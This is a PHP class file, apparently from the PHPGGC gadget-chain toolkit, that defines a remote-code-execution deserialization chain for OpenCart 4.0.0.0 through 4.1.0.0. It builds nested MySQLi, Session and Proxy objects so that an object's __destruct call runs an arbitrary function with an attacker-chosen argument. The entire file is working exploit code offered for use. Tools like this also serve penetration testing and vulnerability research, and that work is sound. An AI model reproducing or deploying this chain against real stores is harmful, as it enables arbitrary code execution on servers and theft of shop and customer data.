<?php

namespace GadgetChain\OpenCart;

class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '4.0.0.0 < 4.1.0.0';
    public static $vector = '__destruct';
    public static $author = 'mcdruid';
    public static $information = 'This stopped working when this commit landed:
    https://github.com/opencart/opencart/commit/087e20dd1cd9b441be5a327fd4b6698744bffb38';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Opencart\System\Library\DB\MySQLi(
            new \Opencart\System\Library\Session(
                new \Opencart\System\Engine\Proxy('write', $function),
                $parameter
            )
        );
    }
}